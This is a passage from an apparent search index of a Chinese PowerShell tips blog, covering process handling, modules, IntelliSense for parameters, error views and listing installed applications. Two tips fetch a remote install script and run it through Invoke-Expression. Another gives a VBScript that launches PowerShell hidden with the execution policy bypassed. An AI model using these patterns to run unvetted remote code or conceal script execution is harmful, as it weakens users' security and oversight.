5986","link":"/2020/01/13/testing-network-connections-part-2/"},{"title":"PowerShell 技能连载 - 杀死无响应的进程","text":"由 Get-Process 返回的进程对象可以判断该进程当前是否正在响应窗口消息，从而是否正在响应用户请求。此行代码返回当前的 PowerShell 进程的 “Responding” 属性： 12345PS&gt; Get-Process -Id $Pid | Select-Object *respond*Responding---------- True 进程偶尔会变得无响应是很常见的，例如由于高负载和较弱的软件体系结构。当某个进程在较长时间内没有响应时，就会“挂起”，会让用户发疯。 这行代码列出了当前未响应的进程： 123456789PS&gt; Get-Process | Where-Object { !$_.Responding }Handles NPM(K) PM(K) WS(K) CPU(s) Id SI ProcessName------- ------ ----- ----- ------ -- -- ----------- 560 28 21752 580 0.38 18544 1 Calculator 915 65 26660 2528 0.39 14244 1 MicrosoftEdge 488 21 7108 7988 0.09 13400 1 MicrosoftEdgeCP 543 27 16148 520 0.31 21200 1 Time 1132 77 63544 836 1.55 15212 1 WinStore.App 请注意，此列表可能包括已启动但不再使用的 Windows 应用程序。由于属性“正在响应”仅描述当前状态，因此它无法确定进程多长时间未响应。 如果您想汇报（或杀死）一段时间未响应的所有进程，则需要自己进行反复检查并跟踪结果。 下面的代码在网格视图窗口中列出了 3 秒钟没有响应的所有进程。然后，用户可以选择一个或多个要杀死的进程（按住 CTRL 键选择多个进程）。 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455# report processes hanging for more than 3 seconds$timeout = 3# use a hash table to keep track of processes$hash = @{}# use an endless loop and test processesdo{ Get-Process | # look at processes with a window only Where-Object MainWindowTitle | ForEach-Object { # use process ID as key to the hash table $key = $_.id # if the process is responding, reset the counter if ($_.Responding) { $hash[$key] = 0 } # else, increment the counter by one else { $hash[$key]++ } } # copy the hash table keys so that the collection can be # modified $keys = @($hash.Keys).Clone() # emit all processes hanging for longer than $timeout seconds # look at all processes monitored $keys | # take the ones not responding for the time specified in $timeout Where-Object { $hash[$_] -gt $timeout } | ForEach-Object { # reset the counter (in case you choose not to kill them) $hash[$_] = 0 # emit the process for the process ID on record Get-Process -id $_ } | # exclude those that already exited Where-Object { $_.HasExited -eq $false } | # show properties Select-Object -Property Id, Name, StartTime, HasExited | # show hanging processes. The process(es) selected by the user will be killed Out-GridView -Title &quot;Select apps to kill that are hanging for more than $timeout seconds&quot; -PassThru | # kill selected processes Stop-Process -Force # sleep for a second Start-Sleep -Seconds 1} while ($true) 当然，您可以轻松更改代码以生成挂起的进程报表。只需将 Stop-Process 替换为您想要执行的任何操作，即可使用 Add-Content 将流程写入日志文件。要避免一次次地记录相同的进程，您可能想要添加某种黑名单，以跟踪已经记录的进程。","link":"/2020/01/15/killing-non-responding-processes/"},{"title":"PowerShell 技能连载 - 隐藏启动 PowerShell 脚本","text":"没有内置的方法可以隐藏启动 PowerShell 脚本：即使您运行 powershell.exe 并指定 -WindowStyle Hidden，PowerShell 控制台仍将一闪而过。 要隐藏启动 PowerShell 脚本，可以使用 VBScript： 123456Set objShell = CreateObject(&quot;WScript.Shell&quot;)path = WScript.Arguments(0)command = &quot;powershell -noprofile -windowstyle hidden -executionpolicy bypass -file &quot;&quot;&quot; &amp; path &amp; &quot;&quot;&quot;&quot;objShell.Run command,0 将 test.vbs 保存，然后确保以 ANSI 编码保存（用记事本并在另存为对话框的地步下拉列表中选择编码）。VBS 无法处理 UTF8 编码的脚本。当您试图运行这样的脚本时，会得到一个非法字符的异常。 要隐藏启动一个 PowerShell 脚本，可以运行这行命令： 请注意，虽然 wscript.exe 隐藏了 PowerShell 的控制台窗口，但您打开任何 WPF窗口（例如使用 Out-GridView）时，将继续工作并且正常显示。 1Wscript.exe c:\\pathtovbs.vbs c:\\pathtoPS1file.ps1","link":"/2020/01/17/launching-powershell-scripts-invisibly/"},{"title":"PowerShell 技能连载 - 测试等待重启","text":"当 Windows 安装了更新或对操作系统做了相关改变，改变可能需要在重启以后才能生效。当有一个挂起的重启时，操作系统可能不能被完全保护，而且可能无法安装其它软件。 可以通过测试指定的注册表项来确定是否有挂起的重启： 123$rebootRequired = Test-Path &quot;HKLM:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Component Based Servicing\\RebootPending&quot;&quot;Pending reboot: $rebootRequired&quot; 如果 $rebootRequired 的值是 $true，那么就存在一个挂起的重启。","link":"/2020/01/21/testing-for-pending-reboots/"},{"title":"PowerShell 技能连载 - 安装 ActiveDirectory 模块","text":"这是一个对所有处理 Active Directory 的 PowerShell 用户的好消息：在最新的 Windows 10 版本（企业版、专业版）中，Microsoft 提供了 RSAT 工具，因此不需要另外下载。要将使用 AD 的 PowerShell 命令，只需启用 RSAT 功能（请参见下文）。 此外，PowerShell 7 终于原生支持 Active Directory 模块！如果您开始将新的 PowerShell 与Windows PowerShell 并行使用，则现在可以在 PowerShell 7 中使用以前仅在 Windows PowerShell 中工作的所有 AD cmdlet。 在提升权限的 PowerShell 中运行此命令，以查看可用的 RSAT 组件： 12Get-WindowsCapability -Online | Where-Object Name -like Rsat* 要使用 Active Directory 和组策略 PowerShell 模块，请启用 RSAT 功能 1234Get-WindowsCapability -Online | Where-Object Name -like Rsat* | Where-Object State -ne Installed | Add-WindowsCapability -Online 完成后，Windows PowerShell 中将同时提供 Active Directory 和 GroupPolicy PowerShell 模块。在 PowerShell 7 中，只能使用 ActiveDirectory 模块。 12345678910PS&gt; Get-Module -Name ActiveDirectory, GroupPolicy -ListAvailable Directory: C:\\Windows\\system32\\WindowsPowerShell\\v1.0\\ModulesModuleType Version Name ExportedCommands---------- ------- ---- ----------------Manifest 1.0.1.0 ActiveDirectory {Add-ADCentralAccessPolicyMember, Add-ADCom...Manifest 1.0.0.0 GroupPolicy {Backup-GPO, Block-GPInheritance, Copy-GPO...","link":"/2020/01/23/installing-activedirectory-module/"},{"title":"PowerShell 技能连载 - 在 Windows PowerShell 和 PowerShell Core 中共享模块","text":"许多 PowerShell 用户开始研究 PowerShell 7，并与内置的 Windows PowerShell 并行运行。 两个 PowerShell 版本都在自己的位置维护各自的 PowerShell 模块。因此当您添加新模块（即通过 Install-Module）时，需要分别对两个版本的 PowerShell 执行此操作。 不过 Windows PowerShell 和 PowerShell 7 共享同一个文件夹路径：尽管是 Windows PowerShell 引入了该目录，但 PowerShell 7 也会检查此文件夹并自动加载位于其中的模块： C:\\Program Files\\WindowsPowerShell\\Modules 要在两个 PowerShell 版本中同时使用某个模块，请确保将模块复制到此文件夹。使用 Install-Module 时，请使用 -Scope AllUsers（或忽略整个参数）。 由于该文件夹影响所有用户，因此该文件夹受到保护，并且您需要管理员权限才能向其中添加模块。 请注意，PowerShell 还会在另外一个路径中查找模块： C:\\Windows\\system32\\WindowsPowerShell\\v1.0\\Modules 这是所有 Microsoft 模块所在的位置。该路径也会和 PowerShell 7 共享。","link":"/2020/01/27/sharing-modules-in-windows-powershell-and-powershell-core/"},{"title":"PowerShell 技能连载 - 下载 PowerShell 语言参考（或任意文件）","text":"Invoke-WebRequest 可以轻松下载文件。下面的代码下载由 PowerShell Magazine 发布的PowerShell语言参考，并使用关联的程序将其打开： 12345678910111213$url = &quot;https://download.microsoft.com/download/4/3/1/43113f44-548b-4dea-b471-0c2c8578fbf8/powershell_langref_v4.pdf&quot;# get desktop path$desktop = [Environment]::GetFolderPath('Desktop')$destination = &quot;$desktop\\langref.pdf&quot;# enable TLS1.2 for HTTPS connections[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls -bor [Net.SecurityProtocolType]::Tls11 -bor [Net.SecurityProtocolType]::Tls12# download PDF fileInvoke-WebRequest -Uri $url -OutFile $destination -UseBasicParsing# open downloaded file in associated programInvoke-Item -Path $destination 请注意这段代码如何启用 TLS 1.2。是否需要该协议取决于您的连接类型和防火墙。在以上示例中，并不是必须的。对于其它下载链接，可能是必须的。","link":"/2020/01/29/downloading-powershell-language-reference-or-any-file/"},{"title":"PowerShell 技能连载 - 获取原始的 PowerShell 语言说明书","text":"PowerShell 团队曾经发布了丰富而详细的 PowerShell 3 语言参考，并且由于核心语言从未更改，因此该文档仍然非常有价值，并且充满了隐藏的宝藏。 既然文档仍然可用，就获取免费获取它：https://www.microsoft.com/en-us/download/confirmation.aspx?id=36389","link":"/2020/01/31/grab-original-powershell-language-specification/"},{"title":"PowerShell 技能连载 - 安装免费的 Chocolatey 包管理器","text":"Chocolatey 是一个软件包管理系统，可以帮助您下​​载和安装软件包。与 PowerShell Gallery 不同，Chocolatey 不仅限于 PowerShell 模块和脚本，还可以安装各种软件，包括 Notepad ++、Acrobat Reader 或 Chrome 浏览器之类的工具。 如果您准备在具有提升至完整管理员权限的 Shell 中运行 Chocolatey，则很简单。尽管有说明如何在没有完全特权的情况下使 Chocolatey 工作，但几乎肯定会遇到问题。 要在 PowerShell 中使用Chocolatey，请下载其安装脚本并运行它。这需要管理员特权： 12345# download installation code$code = Invoke-WebRequest -Uri 'https://chocolatey.org/install.ps1' -UseBasicParsing# invoke installation codeInvoke-Expression $code 这步之后，您可以在 PowerShell 中使用新的“choco”命令。只需确保在提升权限的 Shell 中运行即可。 可以在此处找到可安装软件包的列表（例如 Acrobat Reader 或 Google Chrome）： https://chocolatey.org/packages 例如，要安装 Chrome 浏览器，请运行以下命令： 1choco install googlechrome -y 同样，当您从未提升的 PowerShell 中运行“choco”时，您会收到一条警告消息，并且大多数软件包将无法正确安装。","link":"/2020/02/04/installing-free-chocolatey-package-management/"},{"title":"PowerShell 技能连载 - 安装并试运行 Windows Terminal","text":"Windows Terminal 是一个新的多选项卡的用于基于控制台的外壳程序。它可以通过 Microsoft Store 正式获得，当前需要 Windows 10 1903 或更高版本。 要从 Microsoft Store 安装它，您首先需要注册，这很令人沮丧。如果要匿名安装 Windows Terminal（并且已在上一个技巧中安装Chocolatey），只需从提升的 PowerShell 中运行以下代码： 1234567# download installation code$code = Invoke-WebRequest -Uri 'https://chocolatey.org/install.ps1' -UseBasicParsing# invoke installation codeInvoke-Expression $code# install windows terminalchoco install microsoft-windows-terminal -y 一旦 Windows Terminal 安装好，您可以通过 “wt” 命令启动它。","link":"/2020/02/06/installing-and-test-driving-windows-terminal/"},{"title":"PowerShell 技能连载 - 区分 IPv4 和 IPv6","text":"假设您要获取所有网卡的IP地址，但按地址类型将它们分开。这是一种仅使用 Select-Object 的实现方法： 123456789101112131415161718function Get-IPAddress{ Get-CimInstance -ClassName Win32_NetworkAdapterConfiguration | Where-Object { $_.IPEnabled -eq $true } | # add two new properties for IPv4 and IPv6 at the end Select-Object -Property Description, MacAddress, IPAddress, IPAddressV4, IPAddressV6 | ForEach-Object { # add IP addresses that match the filter to the new properties $_.IPAddressV4 = $_.IPAddress | Where-Object { $_ -like '*.*.*.*' } $_.IPAddressV6 = $_.IPAddress | Where-Object { $_ -notlike '*.*.*.*' } # return the object $_ } | # remove the property that holds all IP addresses Select-Object -Property Description, MacAddress, IPAddressV4, IPAddressV6}Get-IPAddress 结果看起来类似这样： Description MacAddress IPAddressV4 IPAddressV6 ----------- ---------- ----------- ----------- Realtek USB GbE Family Controller #3 00:E0:4C:F4:A9:35 10.4.121.75 fe80::8109:a41e:192b:367","link":"/2020/02/10/separating-ipv4-and-ipv6/"},{"title":"PowerShell 技能连载 - 参数的智能感知（第 1 部分）","text":"如果输入参数时会为用户建议有效的参数，那岂不是很棒？有时候它们会提示。当您键入以下命令并在 -LogName 之后按空格时，PowerShell ISE 和 Visual Studio Code 会弹出一个 IntelliSense 菜单，其中包含您可以转储的所有日志文件： 1PS&gt; Get-EventLog -LogName 如果没有弹出自动 IntelliSense（换句话说在 PowerShell 控制台中），则可以按 TAB 键自动完成操作，或者按 CTRL + SPACE 手动强制显示 IntelliSense 选择项。 您可以使用自己的 PowerShell 函数执行相同的操作，并且有多种方法可以执行此操作。今天让我们来看一下使用枚举类型的方法。 将枚举类型分配给参数时，它将自动列出可用值。下面的代码使用了 [System.ConsoleColor] 类型，该类型列出了所有有效的控制台颜色： 12345678910function Set-ErrorColor{ param( [Parameter(Mandatory)] [System.ConsoleColor] $Color ) $Host.PrivateData.ErrorForegroundColor = [string]$Color} 当您调用 Set-ErrorColor 时，PowerShell 会自动向您建议有效的控制台颜色。当您选择一个时，该函数将此颜色分配给错误前景色。如果您不喜欢粗糙的红色错误颜色，请将错误消息变成绿色以使其更友好： 123456789PS&gt; Set-ErrorColor -Color GreenPS&gt; 1/0Attempted to divide by zero.At line:1 char:1+ 1/0+ ~~~ + CategoryInfo : NotSpecified: (:) [], RuntimeException + FullyQualifiedErrorId : RuntimeException 旁注：由您来决定对所选类型的处理方式。有时，将其转换为其他类型可能更理想。例如，在上面的示例中，选择的颜色将转换为字符串。为什么呢？ 因为只有 PowerShell 控制台窗口支持 ConsoleColor 颜色。而 PowerShell ISE 编辑器等支持更多颜色，并使用 [System.Windows.Media.Color] 类型。 由于可以将字符串转换为这两种类型，但是 ConsoleColor 不能直接转换为 Windows.Media.Color，因此您可以将其转换为更通用的类型字符串，实现同时在控制台和 PowerShell ISE 中使用用户输入： 123456789101112131415161718192021222324252627# string converts to ConsoleColorPS&gt; [ConsoleColor]'red'Red# string converts to System.Windows.Media.ColorPS&gt; [System.Windows.Media.Color]'red'ColorContext :A : 255R : 255G : 0B : 0ScA : 1ScR : 1ScG : 0ScB : 0# ConsoleColor DOES NOT convert to System.Windows.Media.ColorPS&gt; [System.Windows.Media.Color][ConsoleColor]'red'Cannot convert value &quot;Red&quot; to type &quot;System.Windows.Media.Color&quot;. Error: &quot;Invalid cast from 'System.ConsoleColor' to'System.Windows.Media.Color'.&quot;At line:1 char:1+ [System.Windows.Media.Color][ConsoleColor]'red'+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ + CategoryInfo : InvalidArgument: (:) [], RuntimeException + FullyQualifiedErrorId : InvalidCastIConvertible","link":"/2020/02/12/intellisense-for-parameters-part-1/"},{"title":"PowerShell 技能连载 - 参数的智能感知（第 2 部分）","text":"如果输入参数时会为用户建议有效的参数，那岂不是很棒？有时候它们会提示。当您键入以下命令并在 -LogName 之后按空格时，PowerShell ISE 和 Visual Studio Code 会弹出一个 IntelliSense 菜单，其中包含您可以转储的所有日志文件： 1PS&gt; Get-EventLog -LogName 如果没有弹出自动 IntelliSense（换句话说在 PowerShell 控制台中），则可以按 TAB 键自动完成操作，或者按 CTRL + SPACE 手动强制显示 IntelliSense 选择项。 您可以使用自己的 PowerShell 函数执行相同的操作，并且有多种方法可以执行此操作。在上一个技能中，我们研究了使用枚举类型。但是，如果没有您想要向用户建议的枚举类型定义值，该怎么办？ 要么使用“Enum＂＂关键字定义自己的枚举类型（在 PowerShell 5 或更高版本中支持）： 1234567891011121314151617Enum MyVendors{ Microsoft Amazon Google}function Get-Vendor{ param( [Parameter(Mandatory)] [MyVendors] $Vendor ) &quot;Chosen vendor: $Vendor&quot;} 或使用 Add-Type（所有 PowerShell 版本都支持）使用 C# 创建自己的枚举（请参见下文）。请注意，C# 代码区分大小写，并且枚举内的值以逗号分隔。“enum” 关键字后面的词定义了枚举的类型名称。使用该名称作为参数的数据类型： 12345678910111213141516171819$definition = 'public enum VendorList{ Microsoft, Amazon, Google}'Add-Type -TypeDefinition $definitionfunction Get-Vendor{ param( [Parameter(Mandatory)] [VendorList] $Vendor ) &quot;Chosen vendor: $Vendor&quot;} 还要注意，Add-Type 不能编辑或覆盖类型，因此，如果要在使用枚举后更改枚举，则需要重新启动 PowerShell 或重命名枚举。而使用更新的 PowerShell “enum” 关键字，您可以随时更改枚举。 通过这两种方式，当用户调用您的函数并使用参数时，IntelliSense 都会列出可用的值。 12PS&gt; Get-Vendor -Vendor AmazonChosen vendor: Amazon 注意：将函数导出到模块时，请确保还将枚举也添加到模块中。必须先定义枚举类型，才能在调用使用这些枚举的函数。","link":"/2020/02/14/intellisense-for-parameters-part-2/"},{"title":"PowerShell 技能连载 - 参数的智能感知（第 3 部分）","text":"如果输入参数时会为用户建议有效的参数，那岂不是很棒？有时候它们会提示。当您键入以下命令并在 -LogName 之后按空格时，PowerShell ISE 和 Visual Studio Code 会弹出一个 IntelliSense 菜单，其中包含您可以转储的所有日志文件： 1PS&gt; Get-EventLog -LogName 如果没有弹出自动 IntelliSense（换句话说在 PowerShell 控制台中），则可以按 TAB 键自动完成操作，或者按 CTRL + SPACE 手动强制显示 IntelliSense 选择项。 您可以使用自己的 PowerShell 函数执行相同的操作，并且有多种方法可以执行此操作。在上一个技能中，我们研究了使用自定义枚举类型。今天，我们来看看更简单的方法（以及一些实现它的隐藏技巧）. 使用 IntelliSense 提供参数的最简单方法可能是使用属性 “ValidateSet”：您只需使用允许的值的列表来限定参数： 1234567891011function Get-Vendor{ param( [Parameter(Mandatory)] [ValidateSet('Microsoft','Amazon','Google')] [string] $Vendor ) &quot;Chosen vendor: $Vendor&quot;} $vendor 变量是 “string“ 类型的，但是 PowerShell 内部会确保只能赋值为 “ValidateSet” 中列出的值。您也可以对常规变量使用相同的技巧，并为代码增加额外的安全性： 1234567[ValidateSet('dc1','dc2','ms01')]$servers = 'dc1'# works$servers = 'dc2'# fails$servers = 'dc3' 以下是另一个技巧：”ValidateSet” 属性仅适用于变量和参数分配，而不适用于参数设置值。作为函数作者，您可以将一个用户不可选的值作为缺省值赋给参数： 123456789function Get-Vendor { param( [ValidateSet('Microsoft','Amazon','Google')] [string] $Vendor = 'Undefined' ) &quot;Chosen vendor: $Vendor&quot;} 当用户调用不带参数的 Get-Vendor 时，$vendor 将设置为 “Undefined”。用户为参数分配值后，该值将不可用，从而轻松帮助您区分用户是否进行了选择。","link":"/2020/02/18/intellisense-for-parameters-part-3/"},{"title":"PowerShell 技能连载 - 参数的智能感知（第 4 部分）","text":"如果输入参数时会为用户建议有效的参数，那岂不是很棒？有时候它们会提示。当您键入以下命令并在 -LogName 之后按空格时，PowerShell ISE 和 Visual Studio Code 会弹出一个 IntelliSense 菜单，其中包含您可以转储的所有日志文件： 1PS&gt; Get-EventLog -LogName 如果没有弹出自动 IntelliSense（换句话说在 PowerShell 控制台中），则可以按 TAB 键自动完成操作，或者按 CTRL + SPACE 手动强制显示 IntelliSense 选择项。 您可以使用自己的 PowerShell 函数执行相同的操作，并且有多种方法可以执行此操作。在上一个技能中，我们研究了 “ValidateSet“ 属性。今天，我们来看看一个更超级隐蔽的类似属性，名为 “ArgumentCompleter“. 通过 ValidateSet，您可以定义一系列用户可以选择的值。其它值都不允许输入。 如果您想向用户提供建议（例如）最常用的服务器，但又允许用户指定完全不同的服务器怎么办？这正是 “ArgumentCompleter“ 属性起作用的时候。它定义了一个建议值的列表，但并不限制用户使用这些值： 12345678910function Get-Vendor { param( [Parameter(Mandatory)] [ArgumentCompleter({'Microsoft','Amazon','Google'})] [string] $Vendor ) &quot;Chosen vendor: $Vendor&quot;} 在交互式 PowerShell 控制台中运行此命令并调用 Get-Vendor 时，现在可以按 TAB 或 CTRL + SPACE 自动完成或打开 IntelliSense 列表。不过，该属性不会自动为您弹出 IntelliSense 菜单，并且在 PowerShell 编辑器的编辑器窗格中可能无法使用。 尽管如此，”ArgumentCompleter“ 属性还是有很大帮助的，特别是对于经常使用命令和制表符完成功能的高级用户而言。通过为参数添加默认选项，用户可以快速浏览这些选项，但也可以提交任何其他参数。","link":"/2020/02/20/intellisense-for-parameters-part-4/"},{"title":"PowerShell 技能连载 - 理解 $ErrorView","text":"当 PowerShell 遇到问题时，它会显示一条相当长的错误消息： 1234567PS&gt; 1/0Attempted to divide by zero.At line:1 char:1+ 1/0+ ~~~ + CategoryInfo : NotSpecified: (:) [], RuntimeException + FullyQualifiedErrorId : RuntimeException 在现实生活中，您通常只需要第一行，而早在 2006 年，PowerShell 团队就添加了一个名为 $ErrorView 的首选项变量，该变量可以控制错误消息的显示方式。当将它赋值为“CategoryView”时，将大大缩短错误消息： 123456PS&gt; $ErrorView = 'CategoryView'PS&gt; 1/0NotSpecified: (:) [], RuntimeExceptionPS&gt; 不过，这并不太好用，因为一行无法体现真正重要的信息，并且您可以将它赋值为“NormalView”以返回到默认视图。同时，实用性较差导致多数人从未听说过 $ErrorView。 幸运的是，在PowerShell 7（RC1 中引入）中，团队记住并最终解决了该问题。为了不破坏兼容性，他们选择添加第三个选项：ConciseView。现在，单行错误消息可以正常工作，并显示典型用户需要知道的所有信息： 123456PS&gt; $ErrorView = ConciseViewPS&gt; 1/0RuntimeException: Attempted to divide by zero.PS&gt; 作为 PowerShell 开发人员，只需切换回“NormalView”即可查看其余的错误消息。或者（甚至更好）运行 Get-Error -Newest 1 以获取有关最新错误的详细信息： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354PS C:\\&gt; 1/0 RuntimeException: Attempted to divide by zero. PS C:\\&gt; Get-Error -Newest 1 Exception : Type : System.Management.Automation.RuntimeException ErrorRecord : Exception : Type : System.Management.Automation.ParentContainsErrorRecordException Message : Attempted to divide by zero. HResult : -2146233087 CategoryInfo : NotSpecified: (:) [], ParentContainsErrorRecordException FullyQualifiedErrorId : RuntimeException InvocationInfo : ScriptLineNumber : 1 OffsetInLine : 1 HistoryId : -1 Line : 1/0 PositionMessage : At line:1 char:1 + 1/0 + ~~~ CommandOrigin : Internal ScriptStackTrace : at , : line 1 TargetSite : Name : Divide DeclaringType : System.Management.Automation.IntOps, System.Management.Automation, Version=7.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35 MemberType : Method Module : System.Management.Automation.dll StackTrace : at System.Management.Automation.IntOps.Divide(Int32 lhs, Int32 rhs) at System.Dynamic.UpdateDelegates.UpdateAndExecute2[T0,T1,TRet](CallSite site, T0 arg0, T1 arg1) at System.Management.Automation.Interpreter.DynamicInstruction`3.Run(InterpretedFrame frame) at System.Management.Automation.Interpreter.EnterTryCatchFinallyInstruction.Run(InterpretedFrame frame) Message : Attempted to divide by zero. Data : System.Collections.ListDictionaryInternal InnerException : Type : System.DivideByZeroException Message : Attempted to divide by zero. HResult : -2147352558 ; Source : System.Management.Automation HResult : -2146233087 CategoryInfo : NotSpecified: (:) [], RuntimeException FullyQualifiedErrorId : RuntimeException InvocationInfo : ScriptLineNumber: 1 OffsetInLine : 1 HistoryId : -1 Line : 1/0 PositionMessage : At line:1 char:1 + 1/0 + ~~~ CommandOrigin : Internal ScriptStackTrace : at , : line 1","link":"/2020/02/24/understanding-errorview/"},{"title":"PowerShell 技能连载 - 带颜色的控制台硬拷贝","text":"如果您想硬拷贝 PowerShell 控制台的内容，则可以复制和选择文本，但这会弄乱颜色和格式。 更好的方法是读取控制台屏幕缓冲区，并编写 HTML 文档。然后可以将这些 HTML 文档复制并粘贴到 Word 和其他目标中，并保持格式和颜色。 以下代码当然还不是完美的，但说明了采用的方法： 123456789101112131415161718192021222324function Get-ConsoleBufferAsHtml{ $html = [Text.StringBuilder]'' $null = $html.Append(&quot;&lt;pre style='MARGIN: 0in 10pt 0in; line-height:normal'; font-family:Consolas; font-size:10pt; &gt;&quot;) $bufferWidth = $host.UI.RawUI.BufferSize.Width $bufferHeight = $host.UI.RawUI.CursorPosition.Y $rec = [Management.Automation.Host.Rectangle]::new( 0,0,($bufferWidth - 1),$bufferHeight ) $buffer = $host.ui.rawui.GetBufferContents($rec) for($i = 0; $i -lt $bufferHeight; $i++) { $span = [Text.StringBuilder]'' $foreColor = $buffer[$i, 0].Foregroundcolor $backColor = $buffer[$i, 0].Backgroundcolor for($j = 0; $j -lt $bufferWidth; $j++) { $cell = $buffer[$i,$j] if (($cell.ForegroundColor -ne $foreColor) -or ($cell.BackgroundColor -ne $backColor)) { $null = $html.Append(&quot;&lt;span style='color:$foreColor;background:$backColor'&gt;$($span)&lt;/span&gt;&quot; ) $span = [Text.StringBuilder]'' $foreColor = $cell.Foregroundcolor $backColor = $cell.Backgroundcolor } $null = $span.Append([Web.HttpUtility]::HtmlEncode($cell.Character)) } $null = $html.Append(&quot;&lt;span style='color:$foreColor;background:$backColor'&gt;$($span)&lt;/span&gt;&lt;br/&gt;&quot; ) } $null = $html.Append(&quot;&lt;/pre&gt;&quot;) $html.ToString()} 请注意，此功能需要一个真实的控制台窗口，因此在 PowerShell ISE 中将无法使用。当您运行上述代码时，它将为您提供一个名为 Get-ConsoleBufferAsHtml 的新命令。 要将当前控制台内容硬拷贝到 HTML 文件，请运行以下命令： 1PS&gt; Get-ConsoleBufferAsHtml | Set-Content $env:temp\\test.html 要在关联的浏览器中打开生成的 HTML，请运行以下命令： 1PS&gt; Invoke-Item $env:temp\\test.html","link":"/2020/02/26/creating-colorful-console-hardcopies/"},{"title":"PowerShell 技能连载 - 神秘的动态参数完成器","text":"在上一个技能中，我们介绍了鲜为人知的 “ArgumentCompletion“ 属性，该属性可以为参数提供类似 IntelliSense 的自动完成功能。但是，此属性可以做的更多。之前，我们介绍了以下代码： 12345678910function Get-Vendor { param( [Parameter(Mandatory)] [ArgumentCompleter({'Microsoft','Amazon','Google'})] [string] $Vendor ) &quot;Chosen vendor: $Vendor&quot;} 当用户调用 Get-Vendor 时，通过按 TAB 或 CTRL-SHIFT 键，将显示 “ArgumentCompleter“ 属性中列出的建议。 您可能想知道为什么将字符串列表嵌入大括号（脚本块）中。答案是：因为这段代码实际上是在用户调用完成时执行的。您也可以动态生成该自动完成文本。 这个 Submit-Date 函数具有一个称为 -Date 的参数。每当您按 TAB 键时，自动完成程序都会以引用的 ISO 格式完成当前日期和时间： 12345678910function Submit-Date { param( [Parameter(Mandatory)] [ArgumentCompleter({ '&quot;{0}&quot;' -f (Get-Date -Format &quot;yyyy-MM-dd HH:mm:ss&quot;) })] [DateTime] $Date ) &quot;Chosen date: $Date&quot;} 运行代码来试验效果。接下来，输入 Submit-Date，以及一个空格，然后按 TAB 键。 1PS&gt; Submit-Date -Date &quot;2020-01-21 16:33:19&quot; 同样，下一个函数实现 -FileName 参数，当您按 TAB 键时，它将自动完成 Windows 文件夹中的实际文件名： 123456789101112function Get-File { param( [Parameter(Mandatory)] [ArgumentCompleter({Get-ChildItem -Path $env:windir -Name})] [string] $FileName ) &quot;Chosen file name: $FileName&quot;}Get-File -FileName 每当用户通过按 TAB 或 CTRL-SPACE 调用自动完成功能时，都会执行提交到 ArgumentCompleter 的脚本块中的代码，并将结果用于自动完成功能。 这可能就是为什么 AutoCompleter 属性不会自动弹出 IntelliSense 而是仅响应用户请求自动弹出的原因。请注意，自动完成功能可能无法在编辑器窗格中使用。它是为交互式PowerShell控制台设计的。","link":"/2020/02/28/secret-dynamic-argument-completer/"},{"title":"PowerShell 技能连载 - 列出安装的应用程序（第 1 部分）","text":"是否想知道启动一个应用程序的运行路径？Windows 注册表中有存储以下信息的键： 1234567$key = &quot;HKLM:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\App Paths\\*&quot;, &quot;HKCU:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\App Paths\\*&quot;$lookup = Get-ItemProperty -Path $key |Select-Object -ExpandProperty '(Default)' -ErrorAction Ignore |Where-Object { $_ } |Sort-Object 结果是已注册的应用程序路径的排序列表。您可以轻松地将其转换为查找哈希表，该表根据可执行文件名称查询完整路径： 123456789$key = &quot;HKLM:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\App Paths\\*&quot;, &quot;HKCU:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\App Paths\\*&quot;$lookup = Get-ItemProperty -Path $key | Select-Object -ExpandProperty '(Default)' -ErrorAction Ignore | Where-Object { $_ } | Group-Object -Property {$_.Replace('&quot;','').Split('\\')[-1].ToLower() } -AsHashTable -AsString 您现在可以列出所有已注册的应用程序的清单： 1234567PS&gt; $lookup.Keysoutlook.exewinword.exesnagit32.exe7zfm.exemsoasb.exe... 或者您可以可以将可执行文件的路径转换为它的真实路径： 12PS&gt; $lookup['excel.exe']C:\\Program Files (x86)\\Microsoft Office\\Root\\Office16\\EXCEL.EXE","link":"/2020/03/03/listing-installed-applications-part-1/"},{"title":"PowerShell 技能连载 - 列出安装的应用程序（第 2 部分）","text":"在上一个技能中，我们读取了注册表，以查找可以启动的应用程序的路径。这种方法效果很好，但存在两个缺陷：首先，列表不包含应用程序的友好名称，其次，列表不完整。仅列出已注册的程序。 让我们获得完整的应用程序列表，并使用三个技巧来克服这些限制： 使用 generic list 作为结果，以便能够将更多信息快速添加到列表中 将 Get-Command 的结果合并到 PowerShell 已知的应用程序中 读取扩展文件信息得到应用程序友好名称 我们从这里开始：从注册表中注册的应用程序列表： 12345678$key = &quot;HKLM:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\App Paths\\*&quot;, &quot;HKCU:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\App Paths\\*&quot;[System.Collections.Generic.List[string]]$list =Get-ItemProperty -Path $key |Select-Object -ExpandProperty '(Default)' -ErrorAction Ignore$list 现在，我们将 Get-Command 已知的应用程序添加到列表中： 12345[System.Collections.Generic.List[string]]$commands = Get-Command -CommandType Application | Select-Object -ExpandProperty Source$list.AddRange($commands) 最后，删除引号，空的和重复的项目来清理列表： 1234$finalList = $list | Where-Object { $_ } | ForEach-Object { $_.Replace('&quot;','').Trim().ToLower() } | Sort-Object -Unique 现在，通过读取每个文件的扩展信息，将列表变成具有应用程序名称、描述和绝对路径的对象。这也消除了所有不存在的路径。以下是完整的代码： 1234567891011121314151617181920212223242526272829$key = &quot;HKLM:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\App Paths\\*&quot;, &quot;HKCU:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\App Paths\\*&quot;[System.Collections.Generic.List[string]]$list =Get-ItemProperty -Path $key |Select-Object -ExpandProperty '(Default)' -ErrorAction Ignore[System.Collections.Generic.List[string]]$commands = Get-Command -CommandType Application | Select-Object -ExpandProperty Source$list.AddRange($commands)$finalList = $list | Where-Object { 